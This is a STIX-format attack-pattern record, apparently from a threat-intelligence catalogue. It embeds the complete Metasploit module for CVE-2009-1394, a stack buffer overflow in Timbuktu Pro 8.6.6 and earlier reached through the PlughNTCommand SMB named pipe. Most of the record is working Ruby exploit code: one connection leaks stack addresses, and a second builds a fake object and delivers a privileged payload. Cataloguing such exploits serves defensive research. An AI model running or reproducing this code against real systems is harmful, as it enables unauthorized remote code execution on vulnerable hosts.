{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c5fa2e2d-61f1-47e3-ac6c-5700abc2b75b",
    "created": "2024-08-14T16:56:23.601423Z",
    "modified": "2024-08-14T16:56:23.601426Z",
    "name": "Timbuktu PlughNTCommand Named Pipe Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in Timbuktu Pro version <= 8.6.6 in a pretty novel way.  This exploit requires two connections. The first connection is used to leak stack data using the buffer overflow to overwrite the nNumberOfBytesToWrite argument. By supplying a large value for this argument it is possible to cause Timbuktu to reply to the initial request with leaked stack data. Using this data allows for reliable exploitation of the buffer overflow vulnerability.  Props to Infamous41d for helping in finding this exploitation path.  The second connection utilizes the data from the data leak to accurately exploit the stack based buffer overflow vulnerability.  TODO: hdm suggested using meterpreter's migration capability and restarting the process for multishot exploitation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/timbuktu_plughntcommand_bof.rb",
            "external_id": "timbuktu_plughntcommand_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1394"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=809"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Timbuktu PlughNTCommand Named Pipe Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in Timbuktu Pro version <= 8.6.6\n        in a pretty novel way.\n\n        This exploit requires two connections. The first connection is used to leak stack data\n        using the buffer overflow to overwrite the nNumberOfBytesToWrite argument. By supplying\n        a large value for this argument it is possible to cause Timbuktu to reply to the initial\n        request with leaked stack data. Using this data allows for reliable exploitation of the\n        buffer overflow vulnerability.\n\n        Props to Infamous41d for helping in finding this exploitation path.\n\n        The second connection utilizes the data from the data leak to accurately exploit\n        the stack based buffer overflow vulnerability.\n\n        TODO:\n        hdm suggested using meterpreter's migration capability and restarting the process\n        for multishot exploitation.\n      },\n      'Author'         => [ 'bannedit' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1394' ],\n          [ 'OSVDB', '55436' ],\n          [ 'BID', '35496' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=809' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'\t=>\n        {\n          'Space'\t=> 2048,\n        },\n      'Platform'\t=> 'win',\n      'Targets'\t=>\n        [\n          # we use a memory leak technique to get the return address\n          # tested on Windows XP SP2/SP3 may require a bit more testing\n          [ 'Automatic Targeting',\n            {\n              # ntdll .data (a fairly reliable address)\n              # this address should be relatively stable across platforms/SPs\n              'Writable' => 0x7C97B0B0 + 0x10 - 0xc\n            }\n          ],\n        ],\n      'Privileged'\t\t=> true,\n      'DisclosureDate'\t=> '2009-06-25',\n      'DefaultTarget'\t=> 0))\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n\n  # we make two connections this code just wraps the process\n  def smb_connection\n\n    connect(versions: [1])\n    smb_login()\n\n    print_status(\"Connecting to \\\\\\\\#{datastore['RHOST']}\\\\PlughNTCommand named pipe\")\n\n    pipe = simple.create_pipe('\\\\PlughNTCommand')\n\n    fid = pipe.file_id\n    trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')\n\n    return pipe\n\n  end\n\n\n  def mem_leak\n\n    pipe = smb_connection()\n\n    print_status(\"Constructing memory leak...\")\n\n    writable_addr = target['Writable']\n\n    buf = make_nops(114)\n    buf[0] =  \"3 \" # specifies the command\n    buf[94] = [writable_addr].pack('V') # this helps us by pass some checks in the code\n    buf[98] = [writable_addr].pack('V')\n    buf[110] = [0x1ff8].pack('V') # number of bytes to leak\n\n    pipe.write(buf)\n    leaked = pipe.read()\n    leaked << pipe.read()\n\n    if (leaked.length < 0x1ff8)\n      print_error(\"Error: we did not get back the expected amount of bytes. We got #{leaked.length} bytes\")\n      pipe.close\n      disconnect\n      return\n    end\n\n\n    offset = 0x1d64\n    stackaddr = leaked[offset, 4].unpack('V')[0]\n    bufaddr = stackaddr - 0xcc8\n\n    print_status \"Stack address found: stack #{sprintf(\"0x%x\", stackaddr)}  buffer #{sprintf(\"0x%x\", bufaddr)}\"\n\n    print_status(\"Closing connection...\")\n    pipe.close\n    disconnect\n\n    return stackaddr, bufaddr\n\n  end\n\n\n  def exploit\n\n    stackaddr, bufaddr = mem_leak()\n\n    if (stackaddr.nil? || bufaddr.nil? ) # just to be on the safe side\n      print_error(\"Error: memory leak failed\")\n      return\n    end\n\n    pipe = smb_connection()\n\n    buf = make_nops(1280)\n    buf[0] =  \"3 \"\n    buf[94] = [bufaddr+272].pack('V') # create a fake object\n    buf[99] = \"\\x00\"\n    buf[256] = [bufaddr+256].pack('V')\n    buf[260] = [bufaddr+288].pack('V')\n    buf[272] = \"\\x00\"\n    buf[512] = payload.encoded\n\n    pipe.write(buf)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-06-25",
    "x_mitre_platforms": [
        "win'"
    ]
}